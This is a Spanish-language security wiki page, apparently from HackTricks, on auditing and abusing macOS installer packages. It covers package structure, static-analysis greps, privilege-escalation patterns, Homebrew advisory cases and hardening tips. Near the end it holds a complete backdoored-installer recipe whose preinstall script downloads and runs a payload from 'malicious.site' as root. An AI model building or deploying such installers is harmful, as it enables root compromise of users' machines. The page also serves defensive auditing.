# Abuso de los instaladores de macOS

{{#include ../../../banners/hacktricks-training.md}}

## Información básica de Pkg

Un **installer package** de macOS (también conocido como archivo `.pkg`) es un formato de archivo utilizado por macOS para **distribuir software**. Estos archivos son como una **caja que contiene todo lo que una pieza de software** necesita para instalarse y ejecutarse correctamente.

El archivo del paquete es un archivo comprimido que contiene una **jerarquía de archivos y directorios que se instalarán en el equipo** objetivo. También puede incluir **scripts** para realizar tareas antes y después de la instalación, como configurar archivos de configuración o eliminar versiones antiguas del software.

### Estructura del paquete

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizaciones (título, texto de bienvenida…) y comprobaciones de scripts/instalación
- **PackageInfo (xml)**: Información, requisitos de instalación, ubicación de instalación y rutas a los scripts que se ejecutarán
- **Bill of materials (bom)**: Lista de archivos que se instalarán, actualizarán o eliminarán, con sus permisos
- **Payload (archivo CPIO comprimido con gzip)**: Archivos que se instalarán en `install-location`, indicado en PackageInfo
- **Scripts (archivo CPIO comprimido con gzip)**: Scripts de preinstalación y postinstalación, además de otros recursos extraídos a un directorio temporal para su ejecución.

### Descomprimir
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Para visualizar el contenido del instalador sin descomprimirlo manualmente, también puedes usar la herramienta gratuita [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Atajos para el análisis estático

Si el objetivo es realizar un análisis, intenta **evitar abrir primero el paquete con `Installer.app`**. Algunos paquetes pueden ejecutar código en cuanto Installer los abre (por ejemplo, mediante `system.run()` o plug-ins del instalador), por lo que la extracción offline suele ser el punto de partida más seguro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Información básica sobre DMG

Los archivos DMG, o Apple Disk Images, son un formato de archivo utilizado por macOS de Apple para las imágenes de disco. Un archivo DMG es esencialmente una **imagen de disco montable** (contiene su propio sistema de archivos) que contiene datos de bloques sin procesar, normalmente comprimidos y, en ocasiones, cifrados. Cuando abres un archivo DMG, macOS lo **monta como si fuera un disco físico**, lo que permite acceder a su contenido.

> [!CAUTION]
> Ten en cuenta que los instaladores **`.dmg`** admiten **tantos formatos** que, en el pasado, algunos que contenían vulnerabilidades fueron abusados para obtener **ejecución de código en el kernel**.

### Estructura de una imagen de disco

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La jerarquía de un archivo DMG puede variar según su contenido. Sin embargo, para los DMG de aplicaciones, normalmente sigue esta estructura:

- Nivel superior: Es la raíz de la imagen de disco. A menudo contiene la aplicación y posiblemente un enlace a la carpeta Applications.
- Aplicación (.app): Es la aplicación real. En macOS, una aplicación suele ser un paquete que contiene muchos archivos y carpetas individuales que conforman la aplicación.
- Enlace a Applications: Es un acceso directo a la carpeta Applications en macOS. Su propósito es facilitar la instalación de la aplicación. Puedes arrastrar el archivo .app a este acceso directo para instalar la aplicación.

## Privesc mediante abuso de pkg

### Ejecución desde directorios públicos

Si un script de preinstalación o postinstalación ejecuta un archivo como **`/var/tmp/Installerutil`** y un atacante puede reemplazar ese archivo, podrá escalar privilegios cuando el instalador lo invoque. Las charlas y el walkthrough citados muestran variantes de este patrón inseguro de scripts externos.<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Esta es una [función pública](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) que varios instaladores y updaters invocan para **ejecutar algo como root**. Esta función acepta como parámetro la **ruta** del **archivo** que se debe **ejecutar**; sin embargo, si un atacante pudiera **modificar** este archivo, podría **abusar** de su ejecución con root para **escalar privilegios**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Para obtener más información, consulta esta charla: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Abuso del entorno y del shebang

Los bugs modernos de PackageKit demostraron que los scripts de instalación suelen ejecutarse como **código root de confianza**, aunque sigan manteniendo cerca un contexto controlado por el atacante. Al auditar paquetes de proveedores, presta especial atención a:

- Intérpretes de shell como `#!/bin/zsh` / `#!/bin/bash`
- Llamadas como `sudo -u $USER`, `launchctl asuser`, o cualquier lógica que confíe en `$USER`, `$HOME`, `PATH`, `TMPDIR` o rutas relativas
- Intérpretes que no sean de shell y que puedan cargar archivos de inicialización o libraries controlados por el usuario
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Para el bug de entorno root de PackageKit de 2024 (herencia de `~/.zshenv` / `~/.bash*` durante instalaciones iniciadas por el usuario), consulta [la página genérica sobre macOS privesc](../macos-privilege-escalation.md). Si el paquete está **firmado por Apple**, el mismo bug del script puede volverse **relevante para SIP/TCC** porque `system_installd` puede tener `com.apple.rootless.install.heritable`; consulta [la página sobre SIP](../macos-security-protections/macos-sip.md).<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### Entradas con estado y callbacks implícitos

No limites la revisión a la command injection obvia. Un `preinstall`/`postinstall` root puede cruzar un límite de confianza cuando consume **estado que existía antes de la instalación**: archivos predecibles en `/tmp` o `/var/tmp`, un árbol de instalación existente con permisos de escritura para el usuario, archivos de configuración, metadatos del repositorio o un nombre de usuario que posteriormente se pasa a `chown`.<sup>[[9]](#references)[[10]](#references)</sup>

Dos fallos recientes de instaladores de Homebrew ilustran variantes reutilizables:

- **Ownership seleccionado por el atacante:** un override del usuario del paquete se leía desde `/var/tmp/.homebrew_pkg_user.plist`, que era predecible, sin validar su propietario, modo, ACLs, estado de symlink ni procedencia. Un usuario con pocos privilegios podía seleccionar su propia cuenta y un `postinstall` root posterior transfería recursivamente el ownership del árbol y la cache de Homebrew a esa cuenta. Esto era un fallo de asignación de privilegios, no shell injection.<sup>[[9]](#references)</sup>
- **Callbacks de herramientas desde un árbol existente:** un `postinstall` root ejecutaba `git checkout` dentro de una instalación que intencionadamente permitía escritura a su usuario habitual. Por tanto, colocar un `.git/hooks/post-checkout` ejecutable convertía una actualización posterior del paquete mediante GUI/MDM en ejecución de código como root. En la ruta de Intel, combinar el directorio `.git` incluido en el paquete con el repositorio existente también conservaba los hooks añadidos por el atacante.<sup>[[10]](#references)</sup>

La segunda primitiva es fácil de modelar durante un test autorizado; el trigger solo ocurre cuando el instalador privilegiado vulnerable ejecuta posteriormente una operación de Git capaz de activar hooks.<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
Expande los paquetes anidados y asigna cada fuente controlada por el atacante a un sink privilegiado. Además de la ejecución directa, busca parsers, cambios de propiedad y herramientas con mecanismos de plug-in/hook.<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
Para hardening, mueve los inputs privilegiados a un directorio de staging propiedad de root y valida cada path inmediatamente antes de usarlo (archivo normal, propietario/modo esperados, sin ACL inseguras y sin recorrido mediante symlinks). Evita cambiar recursivamente la propiedad desde una identidad no confiable. Cuando Git deba ejecutarse sobre un árbol preexistente, suprime explícitamente los callbacks (por ejemplo, `git -c core.hooksPath=/dev/null ...`) o reemplaza atómicamente los metadatos del repositorio antes de invocar Git.<sup>[[9]](#references)[[10]](#references)</sup>

### Ejecución mediante montaje

Si un installer escribe en `/tmp/fixedname/bla/bla`, es posible **crear un montaje** sobre `/tmp/fixedname` con noowners para poder **modificar cualquier archivo durante la instalación** y abusar del proceso de instalación.

Un ejemplo de esto es **CVE-2021-26089**, que logró **sobrescribir un script periódico** para obtener ejecución como root. Para obtener más información, consulta la charla: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## pkg como malware

### Payload vacío

Es posible simplemente generar un archivo **`.pkg`** con **scripts pre y post-install** sin ningún payload real aparte del malware incluido en los scripts.<sup>[[2]](#references)</sup>

### JS en Distribution xml

Es posible añadir etiquetas **`<script>`** en el archivo **distribution xml** del paquete; ese código se ejecutará y podrá **ejecutar comandos** mediante **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

En los paquetes de distribución, esto suele depender de que el archivo `Distribution` de nivel superior habilite scripts externos, por ejemplo mediante `allow-external-scripts="true"`. Por lo tanto, revisar únicamente `preinstall` / `postinstall` no es suficiente: el **Distribution XML** en sí puede contener hooks `installation-check` / `volume-check` y rutas de ejecución directas mediante `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Instalador con backdoor

Instalador malicioso que utiliza un script y código JS dentro de dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - Desempaquetando PKGs: Una mirada al interior de los paquetes de instalación de macOS y fallos de seguridad comunes](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0: "El mundo salvaje de los instaladores de macOS" - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - Desempaquetando PKGs: Una mirada al interior de los paquetes de instalación de macOS](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe - Red Teaming en macOS: Explotando paquetes de instalación](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822: Escalada de privilegios en PackageKit de macOS](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [Rompiendo SIP con paquetes firmados por Apple](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0: "Montaña de bugs" - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - Muerte por 1000 instaladores en macOS y todo está roto](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [El instalador de Homebrew para macOS confía en un plist package-user controlado por el usuario](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [Ejecución de código como root mediante Git hooks en un postinstall PKG de macOS](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
